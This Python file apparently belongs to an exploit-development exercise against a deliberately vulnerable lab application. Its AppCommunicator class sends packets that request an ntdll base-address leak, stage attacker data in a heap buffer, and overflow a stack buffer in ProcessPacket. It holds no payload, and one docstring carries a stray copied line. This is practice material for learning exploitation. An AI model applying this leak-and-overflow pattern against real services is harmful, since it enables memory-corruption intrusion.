from NetworkHelper import NetworkHelper
from CustomStructs import *
import ctypes


class AppCommunicator:
    def __init__(self, host, port) -> None:
        self.network = NetworkHelper(host, port)
        self.connected = False
    
    def request_leak(self, heap_size):
        """
        Request a leak of the ntdll base address
        and a new heap buffer of size heap_size.
        
        :param heap_size: The number of bytes the vulnerable app should allocate.
        """
        if not self.connected:
            self.network.connect()
            self.connected = True
        
        # Create our request packet.
        leak_request = LeakRequest()
        leak_request.Header.Type = PacketType.Leak.value
        leak_request.Header.Size = ctypes.sizeof(leak_request)
        leak_request.RequestedHeapSize = heap_size
        leak_request_packet = bytes(leak_request)

        # Send it.
        self.network.send_bytes(leak_request_packet)

        # Receive a leak response structure.
        leak_response = LeakResponse()
        leak_response = bytes_to_struct(self.network.recv_bytes(ctypes.sizeof(leak_response)), LeakResponse)

        return leak_response

    def request_heap_copy(self, heap_data):
        """
        Request that heap_data be copied into the previously
        allocated heap memory.
        and a new heap buffer of size heap_size.
        
        :param heap_data: The data that should be copied into the allocated heap region.
        """
        if not self.connected:
            self.network.connect()
            self.connected = True
        
        # Create our request packet.
        update_heap_request = BasePacket()
        update_heap_request.Type = PacketType.UpdateHeapData.value
        update_heap_request.Size = ctypes.sizeof(update_heap_request) + len(heap_data)
        update_heap_request_packet = bytes(update_heap_request)

        # Send the base packet and heap data separately.
        self.network.send_bytes(update_heap_request_packet)
        self.network.send_bytes(heap_data)

    def request_overflow(self, overflow_data):
        """
        Request that overflow_data be copied into the overflowBuffer
        in the VulnerableApp!ProcessPacket function.
        
        :param overflow_data: The data that should be copied to the overflowable buffer.
        """
        if not self.connected:
            self.network.connect()
            self.connected = True
        
        # Create our request packet.
        overflow_request = BasePacket()
        overflow_request.Type = PacketType.Overflow.value
        overflow_request.Size = ctypes.sizeof(overflow_request) + len(overflow_data)
        overflow_request_packet = bytes(overflow_request)

        # Send the base packet and overflow data separately.
        self.network.send_bytes(overflow_request_packet)
        self.network.send_bytes(overflow_data)
